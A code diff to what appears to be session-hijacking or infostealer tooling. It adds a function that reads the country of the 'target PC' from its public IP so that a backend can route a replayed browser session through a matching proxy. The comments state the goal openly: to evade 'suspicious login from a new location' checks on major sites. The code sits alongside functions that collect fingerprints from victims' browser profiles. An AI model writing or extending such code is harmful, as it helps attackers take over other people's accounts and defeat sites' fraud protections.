@@ -1318,6 +1318,10 @@ def collect_system_fingerprint():
         "device_memory": _get_device_memory(),
         "platform": _get_platform_str(),
         "os_version": _get_os_version(),
+        # Country code from the target PC's real public IP.
+        # The backend uses this to auto-select a proxy so the session
+        # originates from the same country — no location mismatch.
+        "country": _fetch_ip_country(),
     }
 
 def collect_browser_fingerprint(user_data_path, browser_name):
@@ -1328,6 +1332,26 @@ def collect_browser_fingerprint(user_data_path, browser_name):
         "user_agent": ua,
         "version": version,
     }
+
+
+# ---------------------------------------------------------------------------
+# IP country detection — lightweight, just the country code for proxy routing
+# ---------------------------------------------------------------------------
+def _fetch_ip_country(timeout=5):
+    """Get the target machine's country code from its public IP.
+
+    Called FROM the user's PC, so the IP returned is their real public IP.
+    The country code is used by the backend to auto-select a matching proxy
+    so the session appears to come from the same country — preventing the
+    "suspicious login from a new location" security check on every major site.
+    """
+    try:
+        resp = requests.get("https://ipinfo.io/json", timeout=timeout)
+        if resp.status_code != 200:
+            return ""
+        return (resp.json().get("country") or "").strip().upper()
+    except Exception:
+        return ""
 
 
 # ---------------------------------------------------------------------------
@@ -1440,6 +1464,8 @@ def main(args):
     emit("")
     emit("Collecting browser fingerprint...")
     machine_fp = collect_system_fingerprint()
+    if machine_fp.get("country"):
+        emit(f"  Country: {machine_fp['country']}")
     browser_fps = {}
     for b in chromium:
         fp = collect_browser_fingerprint(b["user_data"], b["name"])
